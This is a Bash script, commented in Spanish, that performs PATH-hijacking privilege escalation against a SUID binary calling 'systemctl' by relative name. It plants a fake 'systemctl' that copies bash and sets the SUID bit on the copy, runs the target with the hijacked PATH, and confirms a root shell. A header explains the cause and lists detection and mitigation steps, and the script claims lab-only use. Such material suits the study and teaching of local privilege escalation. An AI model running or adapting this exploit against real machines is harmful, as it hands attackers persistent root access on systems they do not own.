#!/bin/bash
# privesc_path_hijack.sh
#
# Demostración de "PATH hijacking" contra un binario SUID que invoca
# otro programa por nombre (sin ruta absoluta) vía system()/popen(),
# sin sanear el PATH heredado del proceso que lo lanzó.
#
# RAZONAMIENTO (por qué funciona):
#   1. Un binario SUID se ejecuta con el EUID del propietario (root),
#      pero conserva el entorno de quien lo invoca, incluido PATH,
#      salvo que el propio binario lo reinicie explícitamente.
#   2. Si llama a otro programa por nombre relativo (p.ej.
#      `system("systemctl status algo")` en vez de `/usr/bin/systemctl`),
#      la resolución depende del PATH heredado, en orden.
#   3. Anteponiendo un directorio propio al PATH con un ejecutable del
#      mismo nombre, ese impostor se ejecuta en su lugar — con el EUID
#      de root del binario SUID.
#   4. El impostor puede entonces hacer cualquier cosa como root,
#      típicamente copiar una shell y ponerle el bit SUID.
#
#   La causa raíz no es el binario SUID en sí, sino la confianza
#   implícita en el entorno de un proceso con privilegios elevados.
#
# DETECCIÓN / MITIGACIÓN:
#   - Fijar PATH explícitamente en cualquier SUID/SGID
#     (`setenv("PATH", "/usr/bin:/bin", 1)`) o usar siempre ruta
#     absoluta + `execve()` en vez de `system()`.
#   - Evitar SUID salvo necesidad estricta; preferir capabilities de
#     Linux acotadas (`setcap`).
#   - Auditoría periódica de `find / -perm -4000 -type f`, con especial
#     atención a binarios fuera de rutas de paquetes del sistema.
#   - EDR/auditd: alertar si un proceso con EUID 0 ejecuta un binario
#     desde un directorio no estándar (p.ej. /tmp o un home de usuario).
#
# Uso exclusivo en entornos de laboratorio con autorización explícita.
#
# Uso:
#   HIJACK_DIR=/tmp SUID_BINARY=/ruta/al/binario ./privesc_path_hijack.sh

set -euo pipefail

usage() {
  cat <<USAGE
Uso: HIJACK_DIR=<dir> SUID_BINARY=<ruta> $0

Variables de entorno:
  HIJACK_DIR    Directorio escribible antepuesto al PATH (por defecto: /tmp)
  SUID_BINARY   Ruta al binario SUID vulnerable (obligatoria)

Requisitos: poder ejecutar comandos como el usuario que lanza el binario
SUID, con permiso de escritura en HIJACK_DIR, y haber localizado el
binario vulnerable (p.ej. find / -perm -4000 -type f 2>/dev/null).

Solo para uso contra objetivos de laboratorio con autorización explícita.
USAGE
}

if [[ "${1:-}" == "-h" || "${1:-}" == "--help" ]]; then
  usage
  exit 0
fi

HIJACK_DIR="${HIJACK_DIR:-/tmp}"
SUID_BINARY="${SUID_BINARY:?Define SUID_BINARY, la ruta del binario SUID vulnerable (usa -h para ayuda)}"

if [[ ! -x "$SUID_BINARY" ]]; then
  echo "[-] SUID_BINARY no existe o no es ejecutable: ${SUID_BINARY}" >&2
  exit 1
fi

mkdir -p "$HIJACK_DIR"

# 1. "systemctl" falso: copia bash y le pone el bit SUID.
#    Heredoc SIN comillas en el delimitador: HIJACK_DIR se sustituye
#    AHORA (al generar el script), no queda como variable sin resolver
#    si no está exportada cuando el impostor se ejecute.
cat > "${HIJACK_DIR}/systemctl" << EOF
#!/bin/bash
cp /bin/bash "${HIJACK_DIR}/rootbash"
chmod 4755 "${HIJACK_DIR}/rootbash"
EOF
chmod +x "${HIJACK_DIR}/systemctl"

# 2. Disparamos el binario SUID con el PATH secuestrado.
PATH="${HIJACK_DIR}:$PATH" "${SUID_BINARY}"

# 3. Verificación.
if [ -u "${HIJACK_DIR}/rootbash" ]; then
  echo "[+] Privesc OK: ${HIJACK_DIR}/rootbash tiene bit SUID de root."
  echo "    Uso: ${HIJACK_DIR}/rootbash -p -c 'comando como root'"
else
  echo "[-] No se generó el binario SUID; revisa si SUID_BINARY es vulnerable." >&2
  exit 1
fi
